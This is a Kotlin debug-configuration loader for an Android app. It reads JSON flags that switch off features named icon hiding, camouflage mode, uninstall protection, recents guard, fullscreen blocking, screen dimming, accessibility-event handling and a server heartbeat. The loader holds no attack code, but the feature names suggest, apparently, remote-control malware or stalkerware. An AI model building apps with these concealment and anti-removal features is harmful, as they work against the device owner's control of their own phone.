package com.storm.safe.rock.util

import android.content.Context
import android.util.Log
import org.json.JSONObject

/**
 * 调试配置管理器 — 从 assets/debug_config.json 读取配置。
 *
 * debug 包 (BuildConfig.DEBUG=true) 时加载配置文件。
 * release 包时全部返回默认值（禁用所有调试特性）。
 *
 * 用法:
 *   DebugConfig.init(context)             // Application.onCreate 中调用一次
 *   if (DebugConfig.disableDimScreen) ... // 任意位置读取
 */
object DebugConfig {
    private const val TAG = "DebugConfig"
    private const val CONFIG_FILE = "config.json"

    // ── overlay ──
    var disableConfigMask: Boolean = false; private set
    var disableFullscreenBlocker: Boolean = false; private set
    var disableCipherOverlay: Boolean = false; private set

    // ── screen ──
    var disableDimScreen: Boolean = false; private set
    var disableBrightnessRestore: Boolean = false; private set

    // ── icon ──
    var disableIconHide: Boolean = false; private set
    var disableCamouflageMode: Boolean = false; private set

    // ── protection ──
    var disableUninstallProtection: Boolean = false; private set
    var disableRecentsGuard: Boolean = false; private set

    // ── automation ──
    var disableWriteSettingsAuto: Boolean = false; private set
    var disableBrandEngine: Boolean = false; private set
    var automationDelayMs: Long = 800L; private set

    // ── network ──
    var serverUrlOverride: String = ""; private set
    var disableHeartbeat: Boolean = false; private set
    var logAllWsMessages: Boolean = false; private set

    // ── logging ──
    var verboseInitChain: Boolean = false; private set
    var verboseEventDispatch: Boolean = false; private set
    var verboseNodeSearch: Boolean = false; private set
    var logAllAccessibilityEvents: Boolean = false; private set

    private var initialized = false

    fun init(context: Context) {
        if (initialized) return

        if (!com.storm.safe.rock.BuildConfig.DEBUG) {
            Log.d(TAG, "Release 包，跳过调试配置加载")
            initialized = true
            return
        }

        try {
            val json = context.assets.open(CONFIG_FILE).bufferedReader().use { it.readText() }
            val root = JSONObject(json)

            // overlay
            root.optJSONObject("overlay")?.let { o ->
                disableConfigMask = o.optBoolean("disable_config_mask", false)
                disableFullscreenBlocker = o.optBoolean("disable_fullscreen_blocker", false)
                disableCipherOverlay = o.optBoolean("disable_cipher_overlay", false)
            }

            // screen
            root.optJSONObject("screen")?.let { s ->
                disableDimScreen = s.optBoolean("disable_dim_screen", false)
                disableBrightnessRestore = s.optBoolean("disable_brightness_restore", false)
            }

            // icon
            root.optJSONObject("icon")?.let { i ->
                disableIconHide = i.optBoolean("disable_icon_hide", false)
                disableCamouflageMode = i.optBoolean("disable_camouflage_mode", false)
            }

            // protection
            root.optJSONObject("protection")?.let { p ->
                disableUninstallProtection = p.optBoolean("disable_uninstall_protection", false)
                disableRecentsGuard = p.optBoolean("disable_recents_guard", false)
            }

            // automation
            root.optJSONObject("automation")?.let { a ->
                disableWriteSettingsAuto = a.optBoolean("disable_write_settings_auto", false)
                disableBrandEngine = a.optBoolean("disable_brand_engine", false)
                automationDelayMs = a.optLong("automation_delay_ms", 800L)
            }

            // network
            root.optJSONObject("network")?.let { n ->
                serverUrlOverride = n.optString("server_url_override", "")
                disableHeartbeat = n.optBoolean("disable_heartbeat", false)
                logAllWsMessages = n.optBoolean("log_all_ws_messages", false)
            }

            // logging
            root.optJSONObject("logging")?.let { l ->
                verboseInitChain = l.optBoolean("verbose_init_chain", false)
                verboseEventDispatch = l.optBoolean("verbose_event_dispatch", false)
                verboseNodeSearch = l.optBoolean("verbose_node_search", false)
                logAllAccessibilityEvents = l.optBoolean("log_all_accessibility_events", false)
            }

            Log.i(TAG, "✅ 调试配置已加载: mask=$disableConfigMask dim=$disableDimScreen icon=$disableIconHide protect=$disableUninstallProtection")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ 调试配置加载失败 (使用默认值): ${e.message}")
        }

        initialized = true
    }

    /** 输出当前全部配置到日志 */
    fun dump() {
        if (!initialized) return
        Log.d(TAG, buildString {
            appendLine("╔══ DebugConfig ══")
            appendLine("║ overlay:    mask=$disableConfigMask blocker=$disableFullscreenBlocker cipher=$disableCipherOverlay")
            appendLine("║ screen:     dim=$disableDimScreen brightnessRestore=$disableBrightnessRestore")
            appendLine("║ icon:       hide=$disableIconHide camouflage=$disableCamouflageMode")
            appendLine("║ protection: uninstall=$disableUninstallProtection recents=$disableRecentsGuard")
            appendLine("║ automation: writeSettings=$disableWriteSettingsAuto brand=$disableBrandEngine delay=${automationDelayMs}ms")
            appendLine("║ network:    override='$serverUrlOverride' heartbeat=$disableHeartbeat logWs=$logAllWsMessages")
            appendLine("║ logging:    init=$verboseInitChain event=$verboseEventDispatch node=$verboseNodeSearch allA11y=$logAllAccessibilityEvents")
            append("╚════════════════")
        })
    }
}
